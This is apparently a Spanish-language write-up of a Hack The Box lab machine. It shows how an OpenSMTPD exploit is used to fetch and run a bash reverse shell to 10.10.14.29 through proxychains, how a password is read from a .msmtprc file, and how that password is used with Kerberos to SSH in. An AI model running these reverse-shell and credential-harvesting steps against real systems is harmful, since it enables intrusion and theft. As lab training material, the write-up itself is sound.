## Vuln exploit & Gaining Access {-}

### Ganando acceso con el exploit opensmtpd {-}

1. creamos un ficher index.html que contiene

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.29/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit desde proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29 -O /dev/shm/rev
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'bash /dev/shm/rev
    ```

Ya hemos ganado acceso al contenedor como root.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag pero no es el caso. Vemos un fichero `.msmtprc` en el directorio home del usuario j.nakazawa

```bash
cd /home/j.nakazawa
cat .msmtprc
```

Podemos ver una contraseña. Intentamos connectarnos por ssh a la maquina victima pero la credenciales no son validas. Ademas podemos ver
un mensaje de error un poco raro que habla de GSSAPI-With-MIC. Buscando por internet vemos que el servicio de authentification del ssh
esta usando authenticacion Kerberos.

### Configuracion de krb5 {-}

```bash
apt install krb5-user
dpkg-reconfigure krb5-config

Reino predeterminado de la version5 de Kerberos: REALCORP.HTB
Añadir las config en el ficher /etc/krb5.conf: Si
Servidores de Kerberos para su reino: 10.10.10.224
Servidor administrativo para su reino: 10.10.10.224
```

Aqui podemos modificar el fichero `/etc/krb5.conf` de configuracion para tener lo siguiente

```bash
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
        .REALCORP.HTB = REALCORP.HTB
        REALCORP.HTB = REALCORP.HTB

```

Cacheamos las credenciales del usuario al kerberos con el commando

```bash
> kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
```

Vemos que un fichero `/tmp/krb5cc_0` a sido creado y ahora podemos connectar por ssh 

```bash
ssh j.nakazawa@10.10.10.224
```

Ya estamos en la maquina 10.10.10.224 y podemos leer la flag.
